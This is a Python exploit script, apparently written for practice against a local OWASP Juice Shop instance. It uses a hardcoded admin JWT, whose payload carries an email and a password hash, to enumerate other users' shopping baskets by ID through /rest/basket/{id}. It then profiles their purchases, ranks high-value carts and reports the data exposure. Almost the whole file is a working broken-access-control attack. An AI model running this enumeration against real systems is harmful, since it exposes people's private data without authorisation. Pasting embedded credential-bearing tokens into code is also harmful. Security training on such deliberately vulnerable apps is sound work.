#!/usr/bin/env python3
"""
Broken Access Control - AnÃ¡lisis de ExposiciÃ³n de Datos
Solo lectura pero con anÃ¡lisis profundo
"""

import requests
import json
from urllib.parse import urljoin

class BasketDataExposure:
    def __init__(self, target_url="http://localhost:3000", admin_token=None):
        self.target_url = target_url
        self.session = requests.Session()
        
        if admin_token:
            self.session.headers.update({
                'Authorization': f'Bearer {admin_token}',
                'Content-Type': 'application/json'
            })
    
    def get_detailed_basket_info(self, basket_id):
        """Obtener informaciÃ³n detallada del carrito"""
        try:
            response = self.session.get(
                urljoin(self.target_url, f'/rest/basket/{basket_id}')
            )
            
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    def analyze_user_behavior(self):
        """Analizar comportamiento de usuarios basado en sus carritos"""
        print("\n[ğŸ”] ANÃLISIS DE COMPORTAMIENTO DE USUARIOS")
        
        user_profiles = {}
        
        for basket_id in range(1, 50):
            basket_data = self.get_detailed_basket_info(basket_id)
            
            if basket_data and 'data' in basket_data:
                products = basket_data['data'].get('Products', [])
                
                if products:  # Solo carritos con productos
                    # Analizar patrones de compra
                    total_value = sum(float(p.get('price', 0)) for p in products)
                    product_categories = {}
                    
                    for product in products:
                        name = product.get('name', '')
                        price = float(product.get('price', 0))
                        
                        # Categorizar productos
                        if 'Juice' in name:
                            category = 'Jugos'
                        elif 'Fruit' in name:
                            category = 'Frutas'
                        elif 'Basket' in name:
                            category = 'Canastas'
                        else:
                            category = 'Otros'
                        
                        product_categories[category] = product_categories.get(category, 0) + 1
                    
                    user_profiles[basket_id] = {
                        'product_count': len(products),
                        'total_value': total_value,
                        'categories': product_categories,
                        'products': [p.get('name') for p in products]
                    }
        
        # Mostrar anÃ¡lisis
        print(f"\n[ğŸ“Š] PERFILES DE COMPRA ENCONTRADOS: {len(user_profiles)}")
        
        for basket_id, profile in user_profiles.items():
            print(f"\n  ğŸ›’ Carrito {basket_id}:")
            print(f"     Productos: {profile['product_count']}")
            print(f"     Valor total: ${profile['total_value']:.2f}")
            print(f"     CategorÃ­as: {profile['categories']}")
            print(f"     Productos: {', '.join(profile['products'][:3])}")
            if len(profile['products']) > 3:
                print(f"                ... y {len(profile['products']) - 3} mÃ¡s")
        
        return user_profiles
    
    def find_valuable_baskets(self):
        """Encontrar carritos mÃ¡s valiosos y analizar patrones"""
        print("\n[ğŸ’°] IDENTIFICANDO CARRITOS DE ALTO VALOR")
        
        high_value_baskets = []
        
        for basket_id in range(1, 30):
            basket_data = self.get_detailed_basket_info(basket_id)
            
            if basket_data and 'data' in basket_data:
                products = basket_data['data'].get('Products', [])
                total_value = sum(float(p.get('price', 0)) for p in products)
                
                if total_value > 10:  # Carritos de mÃ¡s de $10
                    high_value_baskets.append({
                        'id': basket_id,
                        'value': total_value,
                        'product_count': len(products),
                        'products': [p.get('name') for p in products]
                    })
        
        # Ordenar por valor
        high_value_baskets.sort(key=lambda x: x['value'], reverse=True)
        
        print(f"\n[ğŸ¯] CARRITOS DE ALTO VALOR ENCONTRADOS: {len(high_value_baskets)}")
        
        for basket in high_value_baskets[:5]:  # Top 5
            print(f"\n  ğŸ’ Carrito {basket['id']}: ${basket['value']:.2f}")
            print(f"     Productos: {basket['product_count']}")
            print(f"     Items: {', '.join(basket['products'])}")
        
        return high_value_baskets
    
    def extract_basket_metadata(self):
        """Extraer metadatos y estadÃ­sticas de todos los carritos"""
        print("\n[ğŸ“ˆ] EXTRACCIÃ“N DE METADATOS Y ESTADÃSTICAS")
        
        stats = {
            'total_baskets': 0,
            'baskets_with_products': 0,
            'total_products': 0,
            'total_value': 0,
            'average_value': 0,
            'product_frequency': {}
        }
        
        for basket_id in range(1, 50):
            basket_data = self.get_detailed_basket_info(basket_id)
            
            if basket_data and 'data' in basket_data:
                stats['total_baskets'] += 1
                products = basket_data['data'].get('Products', [])
                
                if products:
                    stats['baskets_with_products'] += 1
                    stats['total_products'] += len(products)
                    
                    basket_value = sum(float(p.get('price', 0)) for p in products)
                    stats['total_value'] += basket_value
                    
                    # Frecuencia de productos
                    for product in products:
                        name = product.get('name', 'Unknown')
                        stats['product_frequency'][name] = stats['product_frequency'].get(name, 0) + 1
        
        # Calcular promedio
        if stats['baskets_with_products'] > 0:
            stats['average_value'] = stats['total_value'] / stats['baskets_with_products']
        
        # Mostrar estadÃ­sticas
        print(f"\n[ğŸ“Š] ESTADÃSTICAS GENERALES:")
        print(f"    Total de carritos en sistema: {stats['total_baskets']}")
        print(f"    Carritos con productos: {stats['baskets_with_products']}")
        print(f"    Total de productos: {stats['total_products']}")
        print(f"    Valor total: ${stats['total_value']:.2f}")
        print(f"    Valor promedio por carrito: ${stats['average_value']:.2f}")
        
        print(f"\n[ğŸ†] PRODUCTOS MÃS POPULARES:")
        popular_products = sorted(stats['product_frequency'].items(), key=lambda x: x[1], reverse=True)
        for product, count in popular_products[:5]:
            print(f"    {product}: {count} carritos")
        
        return stats

def main():
    ADMIN_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTEtMjMgMTc6Mzk6MjguNDAwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MzkxOTY4NX0.jcI3V4J9IfSh4eHMrAncWgJn4cZQxbKX30PubzJAgXCEZFccepziSKjIxvpQOMSJqr52pnW78koh041OakkyZIAoe5yCDYXTlipI6K3fbipGmAV-bRMRm1puo9fUbScfTzUJPDjddDJpJxJmOE50cyAyk7CP1GyyOKcbHfO26t4"
    
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘   BROKEN ACCESS CONTROL - DATA EXPOSURE       â•‘
    â•‘         AnÃ¡lisis de ExposiciÃ³n de Datos       â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    analyzer = BasketDataExposure("http://localhost:3000", ADMIN_TOKEN)
    
    # Ejecutar anÃ¡lisis completo
    analyzer.analyze_user_behavior()
    analyzer.find_valuable_baskets()
    analyzer.extract_basket_metadata()
    
    print(f"\n{'='*60}")
    print("[ğŸ¯] ANÃLISIS COMPLETADO")
    print("[ğŸš¨] IMPACTO: ExposiciÃ³n de datos de usuarios confirmada")
    print("[ğŸ’¡] Aunque no se puede modificar, la exposiciÃ³n de datos")
    print("[ğŸ’¡] constituye una violaciÃ³n grave de privacidad")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
